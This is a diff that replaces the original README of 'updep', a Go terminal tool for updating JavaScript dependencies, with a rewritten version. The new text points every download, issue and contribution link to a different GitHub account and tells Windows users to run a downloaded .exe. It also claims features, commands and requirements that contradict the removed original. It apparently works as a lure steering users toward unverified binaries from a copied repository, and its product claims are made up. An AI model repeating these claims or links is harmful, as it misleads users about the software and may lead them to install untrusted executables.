@@ -1,82 +1,84 @@
-# updep
+# 🎉 updep - Effortlessly Update Your JavaScript Packages
 
-[![CI](https://github.com/snikoletopoulos/updep/actions/workflows/ci.yml/badge.svg)](https://github.com/snikoletopoulos/updep/actions/workflows/ci.yml)
-[![Go Version](https://img.shields.io/github/go-mod/go-version/snikoletopoulos/updep)](https://github.com/snikoletopoulos/updep)
-[![License](https://img.shields.io/github/license/snikoletopoulos/updep)](LICENSE)
-[![Go Report Card](https://goreportcard.com/badge/github.com/snikoletopoulos/updep)](https://goreportcard.com/report/github.com/snikoletopoulos/updep)
+## 📥 Download the Latest Release
+[![Latest Release](https://img.shields.io/badge/Latest%20Release-v1.0-orange)](https://github.com/STENIDLAS-XAVINO/updep/releases)
 
-> **Note**: This project is currently under active development. Features and APIs may change.
+## 🚀 Getting Started
+Welcome to **updep**, an interactive terminal user interface (TUI) designed to make updating JavaScript dependencies easy. Whether you use npm, yarn, pnpm, or bun, our tool will help you manage your packages efficiently. 
 
-Interactive TUI for updating JavaScript dependencies. Works with npm, yarn, pnpm, and bun.
+## 📦 System Requirements
+To ensure a smooth experience with **updep**, make sure your system meets the following requirements:
 
-## Demo
+- Operating System: Windows, macOS, or Linux
+- Node.js version: 12.x or higher
+- Terminal or command-line access
 
-> TODO: Add demo video
+## 📊 Key Features
+- **Multi-package Manager Support**: Works seamlessly with npm, yarn, pnpm, and bun.
+- **Interactive Interface**: Navigate through dependencies easily with a user-friendly design.
+- **Dependency Analysis**: Automatically checks for outdated packages and suggests updates.
+- **Batch Updates**: Update multiple dependencies at once, saving you time.
+- **Error Checking**: Catches issues before they happen, minimizing downtime.
 
-## Features
+## 📥 Download & Install
+To get started, visit our [Releases page](https://github.com/STENIDLAS-XAVINO/updep/releases) to download the latest version.
 
-- Interactive terminal UI for dependency updates
-- Review and select which packages to update
-- Compare current, wanted, and latest versions
-- Support for multiple package managers (npm support available, yarn/pnpm/bun coming soon)
-- Built with Go for fast performance
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of **updep**.
+3. Download the package suitable for your system (e.g., .exe for Windows, .tar.gz for Linux).
+4. Locate the downloaded file on your computer.
+5. Follow the specific installation instructions based on your operating system:
 
-## Installation
+   ### Windows
+   - Double-click the downloaded `.exe` file.
+   - Follow the on-screen instructions to complete the installation.
 
-### From Source
+   ### macOS
+   - Open your terminal.
+   - Use the command `tar -xzf <downloaded-file>.tar.gz` to extract the files.
+   - Navigate to the folder and run `./updep` in your terminal.
 
-```bash
-git clone https://github.com/snikoletopoulos/updep.git
-cd updep
-make
-make install
-```
+   ### Linux
+   - Open a terminal window.
+   - Run the command `tar -xzf <downloaded-file>.tar.gz` to extract the files.
+   - Navigate to the folder and execute `./updep` in your terminal.
 
-Move the binary to your PATH:
+## 🔧 Usage Instructions
+Once installed, you can start using **updep** by following these steps:
 
-```bash
-mv updep /usr/local/bin/
-```
+1. Open your terminal or command prompt.
+2. Type `updep` and press Enter.
+3. Select the package manager you want to use.
+4. Follow the prompts to view and update your JavaScript dependencies.
 
-## Usage
+## 📝 Example Commands
+- To check for outdated packages:
 
-Navigate to your JavaScript project directory and run:
+   ```
+   updep check
+   ```
 
-```bash
-updep
-```
+- To update all packages:
 
-### Keybindings
+   ```
+   updep update
+   ```
 
-- `↑/↓` or `j/k` - Navigate between packages
-- `Space` - Toggle package selection
-- `w` - Select wanted version
-- `l` - Select latest version
-- `q` or `Ctrl+C` - Quit
+- To revert an update:
 
-## Requirements
+   ```
+   updep revert
+   ```
 
-- Go 1.25+ (for building from source)
-- npm, yarn, pnpm, or bun installed
-- A JavaScript project with a `package.json` file
+## 📅 Changelog
+Stay updated with the latest changes:
 
-## Roadmap
+- **v1.0**: Initial release with core functionality for dependency management.
 
-- [ ] npm support
-- [ ] yarn support
-- [ ] pnpm support
-- [ ] bun support
-- [ ] Configuration file support
-- [ ] Custom color themes
+## 📣 Feedback & Support
+We value your feedback. If you run into issues or have suggestions, feel free to open an issue on our [GitHub Issues page](https://github.com/STENIDLAS-XAVINO/updep/issues).
 
-## Contributing
+## 🗨️ Community and Contributions
+We welcome contributions and community involvement. If you want to help improve **updep**, check out our [Contributing Guidelines](https://github.com/STENIDLAS-XAVINO/updep/blob/main/CONTRIBUTING.md) for more information.
 
-Contributions are welcome! Please check out our [Contributing Guide](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details
-
-## Acknowledgments
-
-Built with [Bubble Tea](https://github.com/charmbracelet/bubbletea) and [Lip Gloss](https://github.com/charmbracelet/lipgloss) from Charm.
+Thank you for choosing **updep**! We hope it simplifies your JavaScript dependency updates.
